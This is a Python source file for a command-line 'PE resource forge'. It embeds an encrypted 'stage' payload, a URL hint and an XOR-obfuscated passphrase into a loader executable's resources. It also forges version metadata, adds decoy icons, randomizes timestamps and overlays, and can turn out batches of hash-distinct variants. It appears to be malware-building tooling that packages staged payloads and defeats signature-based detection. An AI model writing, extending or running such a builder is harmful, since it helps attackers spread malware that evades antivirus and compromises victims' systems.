"""Vanta Forge - PE resource forging and stage embedding.

Usage:
    python -I tools/forge.py mutate loader.exe -o variant.exe --stage stage.venv
    python -I tools/forge.py mutate loader.exe -o variant.exe --decoys 3 --overlay 4096
    python -I tools/forge.py batch loader.exe -o outdir --count 5 --stage stage.venv

The tool does not touch code sections.  It merges new resources into a fresh
resource section, replaces RT_VERSION, appends decoy icon groups, randomizes
the PE timestamp and optionally appends an overlay.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

try:
    import pefile  # optional validation only
except Exception:  # pragma: no cover
    pefile = None

from forge_pkg import icons, resources, version  # noqa: E402
from forge_pkg.pe import PEImage  # noqa: E402
from forge_pkg.resources import Blob, LANG_EN_US, RT_RCDATA, RT_VERSION  # noqa: E402

RES_STAGE = 0x4E58
RES_HINT = 0x4E57
RES_PASS = 0x4E59
PASS_MASK = bytes([0x5A, 0xC3, 0x91, 0x2E, 0x77, 0xB4, 0xE8, 0x1D])


def encode_passphrase(text: str) -> bytes:
    raw = text.encode("utf-8")
    return bytes(b ^ PASS_MASK[i & 7] for i, b in enumerate(raw))


def mutate(
    loader: bytes,
    *,
    stage: bytes | None = None,
    hint: str | None = None,
    passphrase: str | None = None,
    decoys: int = 2,
    add_version: bool = True,
    overlay: int = 0,
    seed: int = 0,
) -> tuple[bytes, dict]:
    rng = random.Random(seed)
    image = PEImage(loader)
    tree = resources.parse_resources(image)

    if stage is not None:
        resources.replace_resource(tree, RT_RCDATA, RES_STAGE, LANG_EN_US, Blob(stage, 0))
    if hint is not None:
        resources.replace_resource(
            tree, RT_RCDATA, RES_HINT, LANG_EN_US, Blob(hint.encode("utf-8"), 0)
        )
    if passphrase is not None:
        resources.replace_resource(
            tree, RT_RCDATA, RES_PASS, LANG_EN_US, Blob(encode_passphrase(passphrase), 0)
        )

    version_meta = None
    if add_version:
        version_blob, version_meta = version.build_version_info(rng)
        resources.replace_resource(tree, RT_VERSION, 1, LANG_EN_US, Blob(version_blob, 0))

    start_id = resources.max_icon_id(tree) + 1
    decoy_names = icons.add_decoys(tree, rng, decoys, start_id)

    new_va, _, _ = image.plan_resource_section(0)
    blob = resources.build_resources(tree, new_va)
    image.append_section(b".rsrc", blob)
    image.set_timestamp(rng.randint(1_577_836_800, 1_795_000_000))
    if overlay > 0:
        image.data.extend(rng.randbytes(overlay))

    result = image.to_bytes()
    info = {
        "resource_bytes": len(blob),
        "resource_rva": new_va,
        "decoy_groups": decoy_names,
        "version": version_meta,
        "timestamp": int.from_bytes(result[image.file_header_off + 4 : image.file_header_off + 8], "little"),
        "sha256": hashlib.sha256(result).hexdigest(),
        "size": len(result),
        "overlay": overlay,
    }
    return result, info


def validate(path: Path) -> dict:
    if pefile is None:
        raise RuntimeError("pefile is not installed")
    pe = pefile.PE(str(path), fast_load=False)
    counts: dict[str, int] = {}
    if hasattr(pe, "DIRECTORY_ENTRY_RESOURCE"):
        for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries:
            key = entry.name.string.decode(errors="replace") if entry.name else str(entry.id)
            counts[key] = len(entry.directory.entries)
    result = {
        "sections": [(s.Name.rstrip(b"\0").decode(errors="replace"), s.SizeOfRawData) for s in pe.sections],
        "resource_types": counts,
        "timestamp": pe.FILE_HEADER.TimeDateStamp,
    }
    pe.close()
    return result


def run_mutate(args: argparse.Namespace) -> int:
    loader = Path(args.input).read_bytes()
    stage = Path(args.stage).read_bytes() if args.stage else None
    result, info = mutate(
        loader,
        stage=stage,
        hint=args.hint,
        passphrase=args.passphrase,
        decoys=args.decoys,
        add_version=not args.no_version,
        overlay=args.overlay,
        seed=args.seed,
    )
    output = Path(args.output)
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_bytes(result)
    print(f"[+] {args.input} -> {output}")
    print(f"    size      : {info['size']} bytes")
    print(f"    resources : {info['resource_bytes']} bytes at RVA 0x{info['resource_rva']:x}")
    print(f"    decoys    : {len(info['decoy_groups'])} icon groups")
    print(f"    sha256    : {info['sha256']}")
    try:
        extra = validate(output)
        info["validation"] = extra
        print(f"    parsed    : {extra['resource_types']}")
    except Exception as exc:  # pragma: no cover - diagnostic only
        print(f"    [!] validation skipped: {exc}")
    if args.json:
        Path(args.json).write_text(json.dumps(info, indent=2), encoding="utf-8")
    return 0


def run_batch(args: argparse.Namespace) -> int:
    loader = Path(args.input).read_bytes()
    stage = Path(args.stage).read_bytes() if args.stage else None
    outdir = Path(args.output)
    outdir.mkdir(parents=True, exist_ok=True)
    manifest = []
    for index in range(args.count):
        seed = args.seed + index * 0x9E3779B1
        result, info = mutate(
            loader,
            stage=stage,
            hint=args.hint,
            passphrase=args.passphrase,
            decoys=args.decoys,
            add_version=not args.no_version,
            overlay=args.overlay,
            seed=seed,
        )
        name = f"variant_{index:02d}_{info['sha256'][:8]}.exe"
        path = outdir / name
        path.write_bytes(result)
        manifest.append({"file": name, **info})
        print(f"[+] {path}  ({info['size']} bytes, {len(info['decoy_groups'])} decoys)")
    (outdir / "manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="forge", description="Vanta PE resource forge")
    sub = parser.add_subparsers(dest="command", required=True)

    mutate = sub.add_parser("mutate", help="create one variant")
    mutate.add_argument("input")
    mutate.add_argument("-o", "--output", required=True)
    mutate.add_argument("--stage", default=None, help="embed a VENV envelope as RCDATA 0x4e58")
    mutate.add_argument("--hint", default=None, help="embed a path/URL hint as RCDATA 0x4e57")
    mutate.add_argument("--passphrase", default=None, help="embed a passphrase override as RCDATA 0x4e59")
    mutate.add_argument("--decoys", type=int, default=2)
    mutate.add_argument("--no-version", action="store_true")
    mutate.add_argument("--overlay", type=int, default=0)
    mutate.add_argument("--seed", type=int, default=0)
    mutate.add_argument("--json", default=None)
    mutate.set_defaults(func=run_mutate)

    batch = sub.add_parser("batch", help="create N variants")
    batch.add_argument("input")
    batch.add_argument("-o", "--output", required=True)
    batch.add_argument("--count", type=int, default=5)
    batch.add_argument("--stage", default=None)
    batch.add_argument("--hint", default=None)
    batch.add_argument("--passphrase", default=None)
    batch.add_argument("--decoys", type=int, default=2)
    batch.add_argument("--no-version", action="store_true")
    batch.add_argument("--overlay", type=int, default=0)
    batch.add_argument("--seed", type=int, default=0)
    batch.set_defaults(func=run_batch)
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    try:
        return int(args.func(args))
    except (ValueError, OSError, ImportError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
